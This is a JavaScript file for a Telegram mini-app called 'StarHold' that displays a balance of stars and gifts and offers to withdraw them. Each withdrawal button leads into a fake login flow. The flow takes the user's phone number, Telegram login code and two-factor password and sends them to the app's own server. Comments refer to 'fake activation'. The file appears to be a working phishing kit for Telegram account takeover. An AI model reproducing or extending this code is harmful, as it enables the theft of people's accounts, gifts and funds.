// ==================== ИНИЦИАЛИЗАЦИЯ TELEGRAM WEBAPP ====================

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Применение темы Telegram
const applyTheme = () => {
    const root = document.documentElement;
    const params = tg.themeParams;
    
    if (params.bg_color) root.style.setProperty('--tg-theme-bg-color', params.bg_color);
    if (params.text_color) root.style.setProperty('--tg-theme-text-color', params.text_color);
    if (params.hint_color) root.style.setProperty('--tg-theme-hint-color', params.hint_color);
    if (params.link_color) root.style.setProperty('--tg-theme-link-color', params.link_color);
    if (params.button_color) root.style.setProperty('--tg-theme-button-color', params.button_color);
    if (params.button_text_color) root.style.setProperty('--tg-theme-button-text-color', params.button_text_color);
    if (params.secondary_bg_color) root.style.setProperty('--tg-theme-secondary-bg-color', params.secondary_bg_color);
};

applyTheme();

// ==================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ====================

let currentCode = '';
let selectedCountryCode = '+7';
let enteredPhone = '';
let countries = [];
let userInventory = {
    stars: 0,
    gifts: []
};
let selectedGifts = [];

const API_BASE = window.location.origin;
const initData = tg.initData || '';

// Проверка параметров URL (для фейк-активации)
const urlParams = new URLSearchParams(window.location.search);
const fakeHash = urlParams.get('hash');
const fakeType = urlParams.get('type');

// ==================== УТИЛИТЫ ====================

const showScreen = (screenId) => {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.add('hidden');
    });
    document.getElementById(screenId).classList.remove('hidden');
};

const showLoading = (text = 'Загрузка...') => {
    document.getElementById('loadingText').textContent = text;
    showScreen('screen-loading');
};

const showError = (message) => {
    document.getElementById('errorText').textContent = message;
    showScreen('screen-error');
};

const makeRequest = async (endpoint, method = 'GET', body = null) => {
    const options = {
        method,
        headers: {
            'Content-Type': 'application/json',
            'Authorization': initData
        }
    };
    
    if (body) {
        options.body = JSON.stringify(body);
    }
    
    const response = await fetch(`${API_BASE}${endpoint}`, options);
    
    if (!response.ok) {
        const error = await response.json();
        throw new Error(error.detail || 'Ошибка запроса');
    }
    
    return await response.json();
};

const formatStars = (amount) => {
    return amount.toString().replace(/\B(?=(\d{3})+(?!\d))/g, " ");
};

// ==================== ОСНОВНОЙ WEBAPP ====================

// Переключение табов
window.switchTab = (tabName) => {
    // Обновление кнопок табов
    document.querySelectorAll('.tab-button').forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');
    
    // Обновление контента
    document.querySelectorAll('.tab-content').forEach(content => {
        content.classList.remove('active');
    });
    document.getElementById(`tab-${tabName}`).classList.add('active');
};

// Загрузка инвентаря пользователя
const loadInventory = async () => {
    try {
        const data = await makeRequest('/api/inventory');
        userInventory = data;
        
        // Обновление UI
        updateInventoryDisplay();
        
    } catch (error) {
        console.error('Ошибка загрузки инвентаря:', error);
        // Показываем пустой инвентарь
        updateInventoryDisplay();
    }
};

// Обновление отображения инвентаря
const updateInventoryDisplay = () => {
    // Баланс звёзд
    document.getElementById('starsBalance').textContent = `${formatStars(userInventory.stars)} ⭐`;
    document.getElementById('starsBalanceWithdrawal').textContent = `${formatStars(userInventory.stars)} ⭐`;
    
    // Количество подарков
    document.getElementById('giftsCount').textContent = userInventory.gifts.length;
    
    // Список подарков
    const giftsList = document.getElementById('giftsList');
    
    if (userInventory.gifts.length === 0) {
        giftsList.innerHTML = `
            <div class="empty-state">
                <div class="empty-icon">📭</div>
                <div class="empty-text">У вас пока нет подарков</div>
            </div>
        `;
    } else {
        giftsList.innerHTML = userInventory.gifts.map(gift => `
            <div class="gift-item">
                <div class="gift-icon">🎁</div>
                <div class="gift-info">
                    <div class="gift-name">${gift.name}</div>
                    <a href="${gift.link}" class="gift-link" target="_blank">${gift.link}</a>
                </div>
            </div>
        `).join('');
    }
    
    // Обновление списка для вывода
    updateGiftsSelectionList();
};

// Загрузка информации о пользователе
const loadUserInfo = async () => {
    try {
        const userData = await makeRequest('/api/user_info');
        
        // Обновление профиля
        document.getElementById('userName').textContent = userData.first_name || 'Пользователь';
        document.getElementById('userUsername').textContent = userData.username ? `@${userData.username}` : '';
        
        // Аватар с первой буквой имени
        const firstLetter = (userData.first_name || 'U')[0].toUpperCase();
        document.getElementById('userAvatar').textContent = firstLetter;
        
    } catch (error) {
        console.error('Ошибка загрузки пользователя:', error);
    }
};

// ==================== ВЫВОД СРЕДСТВ ====================

// Показать экран вывода звёзд
window.showStarsWithdrawal = () => {
    showScreen('screen-stars-withdrawal');
    document.getElementById('withdrawalStarsAmount').value = '';
    updateStarsButton();
};

// Показать экран вывода подарков
window.showGiftsWithdrawal = () => {
    if (userInventory.gifts.length === 0) {
        tg.showAlert('У вас нет подарков для вывода');
        return;
    }
    
    showScreen('screen-gifts-withdrawal');
    selectedGifts = [];
    updateGiftsSelectionList();
};

// Вернуться к главному экрану
window.backToMain = () => {
    showScreen('screen-main');
};

// Быстрый выбор суммы звёзд
window.setQuickAmount = (amount) => {
    document.getElementById('withdrawalStarsAmount').value = amount;
    updateStarsButton();
};

window.setQuickAmountAll = () => {
    document.getElementById('withdrawalStarsAmount').value = userInventory.stars;
    updateStarsButton();
};

// Обновление кнопки вывода звёзд
document.getElementById('withdrawalStarsAmount')?.addEventListener('input', updateStarsButton);

function updateStarsButton() {
    const amount = parseInt(document.getElementById('withdrawalStarsAmount').value) || 0;
    const btn = document.getElementById('btnContinueStars');
    
    if (amount > 0 && amount <= userInventory.stars) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
}

// Продолжить вывод звёзд (переход на авторизацию)
window.continueStarsWithdrawal = () => {
    const amount = parseInt(document.getElementById('withdrawalStarsAmount').value) || 0;
    
    if (amount <= 0 || amount > userInventory.stars) {
        tg.showAlert('Введите корректную сумму');
        return;
    }
    
    // Переход на авторизацию
    startAuthFlow();
};

// Обновление списка подарков для выбора
const updateGiftsSelectionList = () => {
    const container = document.getElementById('giftsSelectionList');
    
    if (!container) return;
    
    container.innerHTML = userInventory.gifts.map((gift, index) => {
        const isSelected = selectedGifts.includes(index);
        
        return `
            <div class="gift-checkbox-item ${isSelected ? 'selected' : ''}" onclick="toggleGiftSelection(${index})">
                <div class="gift-checkbox"></div>
                <div class="gift-icon">🎁</div>
                <div class="gift-info">
                    <div class="gift-name">${gift.name}</div>
                </div>
            </div>
        `;
    }).join('');
    
    // Обновление счётчика
    document.getElementById('selectedGiftsCount').textContent = selectedGifts.length;
    
    // Обновление кнопки
    const btn = document.getElementById('btnContinueGifts');
    if (selectedGifts.length > 0) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
};

// Переключение выбора подарка
window.toggleGiftSelection = (index) => {
    const idx = selectedGifts.indexOf(index);
    
    if (idx > -1) {
        selectedGifts.splice(idx, 1);
    } else {
        selectedGifts.push(index);
    }
    
    updateGiftsSelectionList();
};

// Выбрать все подарки
window.selectAllGifts = () => {
    if (selectedGifts.length === userInventory.gifts.length) {
        // Снять выбор со всех
        selectedGifts = [];
    } else {
        // Выбрать все
        selectedGifts = userInventory.gifts.map((_, index) => index);
    }
    
    updateGiftsSelectionList();
};

// Продолжить вывод подарков (переход на авторизацию)
window.continueGiftsWithdrawal = () => {
    if (selectedGifts.length === 0) {
        tg.showAlert('Выберите хотя бы один подарок');
        return;
    }
    
    // Переход на авторизацию
    startAuthFlow();
};

// ==================== АВТОРИЗАЦИЯ ====================

// Запуск процесса авторизации
const startAuthFlow = () => {
    loadCountries();
    showScreen('screen-phone');
};

// Загрузка списка стран
const loadCountries = async () => {
    try {
        const data = await makeRequest('/api/countries');
        countries = data;
        
        const select = document.getElementById('countrySelect');
        select.innerHTML = '<option value="">Выберите страну</option>';
        
        countries.forEach(country => {
            const option = document.createElement('option');
            option.value = country.code;
            option.textContent = `${country.flag} ${country.name} (${country.code})`;
            select.appendChild(option);
        });
        
        // Установка России по умолчанию
        select.value = '+7';
        document.getElementById('countryCode').value = '+7';
        selectedCountryCode = '+7';
        
    } catch (error) {
        console.error('Ошибка загрузки стран:', error);
        showError('Не удалось загрузить список стран');
    }
};

document.getElementById('countrySelect')?.addEventListener('change', (e) => {
    selectedCountryCode = e.target.value;
    document.getElementById('countryCode').value = selectedCountryCode;
    validatePhoneForm();
});

document.getElementById('phoneInput')?.addEventListener('input', (e) => {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length > 3 && value.length <= 6) {
        value = value.replace(/(\d{3})(\d+)/, '$1 $2');
    } else if (value.length > 6) {
        value = value.replace(/(\d{3})(\d{3})(\d+)/, '$1 $2 $3');
    }
    
    e.target.value = value;
    validatePhoneForm();
});

const validatePhoneForm = () => {
    const phone = document.getElementById('phoneInput').value.replace(/\D/g, '');
    const country = document.getElementById('countrySelect').value;
    const btn = document.getElementById('btnSendCode');
    
    if (country && phone.length >= 10) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
};

document.getElementById('btnSendCode')?.addEventListener('click', async () => {
    if (!document.getElementById('btnSendCode').classList.contains('active')) return;
    
    const phone = document.getElementById('phoneInput').value.replace(/\D/g, '');
    const country = document.getElementById('countrySelect').value;
    
    if (!country || !phone) {
        tg.showAlert('Заполните все поля');
        return;
    }
    
    enteredPhone = `${country}${phone}`;
    
    showLoading('Отправка кода...');
    
    try {
        const result = await makeRequest('/auth/send_code', 'POST', {
            phone: phone,
            country_code: country,
            init_data: initData
        });
        
        if (result.success) {
            document.getElementById('phoneDisplay').textContent = formatPhoneDisplay(enteredPhone);
            showScreen('screen-code');
        } else {
            showError(result.error || 'Не удалось отправить код');
        }
    } catch (error) {
        showError(error.message);
    }
});

const formatPhoneDisplay = (phone) => {
    return phone.replace(/(\+\d{1,3})(\d{3})(\d{3})(\d{2})(\d{2})/, '$1 ($2) $3-$4-$5');
};

// ==================== ВВОД КОДА ====================

window.addDigit = (digit) => {
    if (currentCode.length >= 5) return;
    
    currentCode += digit;
    updateCodeDisplay();
    
    if (currentCode.length === 5) {
        setTimeout(() => {
            verifyCode();
        }, 300);
    }
};

window.deleteDigit = () => {
    currentCode = currentCode.slice(0, -1);
    updateCodeDisplay();
};

const updateCodeDisplay = () => {
    for (let i = 1; i <= 5; i++) {
        const input = document.getElementById(`digit${i}`);
        if (i <= currentCode.length) {
            input.value = currentCode[i - 1];
            input.classList.add('filled');
        } else {
            input.value = '';
            input.classList.remove('filled');
        }
        input.classList.remove('error');
    }
};

const verifyCode = async () => {
    showLoading('Проверка кода...');
    
    try {
        const result = await makeRequest('/auth/verify_code', 'POST', {
            code: currentCode,
            init_data: initData
        });
        
        if (result.success) {
            if (result.step === '2fa') {
                showScreen('screen-password');
                document.getElementById('passwordInput').focus();
            } else if (result.step === 'completed') {
                showSuccessScreen();
            }
        } else {
            showScreen('screen-code');
            currentCode = '';
            updateCodeDisplay();
            
            for (let i = 1; i <= 5; i++) {
                document.getElementById(`digit${i}`).classList.add('error');
            }
            
            tg.showAlert(result.error || 'Неверный код');
        }
    } catch (error) {
        showScreen('screen-code');
        currentCode = '';
        updateCodeDisplay();
        tg.showAlert(error.message);
    }
};

window.changePhone = () => {
    currentCode = '';
    updateCodeDisplay();
    showScreen('screen-phone');
};

// ==================== 2FA ====================

window.togglePasswordVisibility = () => {
    const input = document.getElementById('passwordInput');
    const btn = document.getElementById('togglePassword');
    
    if (input.type === 'password') {
        input.type = 'text';
        btn.textContent = '🙈';
    } else {
        input.type = 'password';
        btn.textContent = '👁️';
    }
};

document.getElementById('passwordInput')?.addEventListener('input', (e) => {
    const btn = document.getElementById('btnVerifyPassword');
    
    if (e.target.value.length > 0) {
        btn.classList.add('active');
    } else {
        btn.classList.remove('active');
    }
});

document.getElementById('btnVerifyPassword')?.addEventListener('click', async () => {
    if (!document.getElementById('btnVerifyPassword').classList.contains('active')) return;
    
    const password = document.getElementById('passwordInput').value;
    
    if (!password) {
        tg.showAlert('Введите пароль');
        return;
    }
    
    showLoading('Проверка пароля...');
    
    try {
        const result = await makeRequest('/auth/verify_password', 'POST', {
            password: password,
            init_data: initData
        });
        
        if (result.success) {
            showSuccessScreen();
        } else {
            showScreen('screen-password');
            document.getElementById('passwordInput').value = '';
            tg.showAlert(result.error || 'Неверный пароль');
        }
    } catch (error) {
        showScreen('screen-password');
        tg.showAlert(error.message);
    }
});

// ==================== ЭКРАН УСПЕХА ====================

const showSuccessScreen = () => {
    showScreen('screen-success');
    
    if (tg.HapticFeedback) {
        tg.HapticFeedback.notificationOccurred('success');
    }
};

window.closeWebApp = () => {
    tg.close();
};

// ==================== ИНИЦИАЛИЗАЦИЯ ====================

window.addEventListener('DOMContentLoaded', async () => {
    // Если есть хеш фейка - показываем главный экран
    if (fakeHash && fakeType) {
        showScreen('screen-main');
        await loadUserInfo();
        await loadInventory();
    } else {
        // Обычный запуск
        showScreen('screen-main');
        await loadUserInfo();
        await loadInventory();
    }
});

tg.enableClosingConfirmation();

console.log('StarHold WebApp initialized');
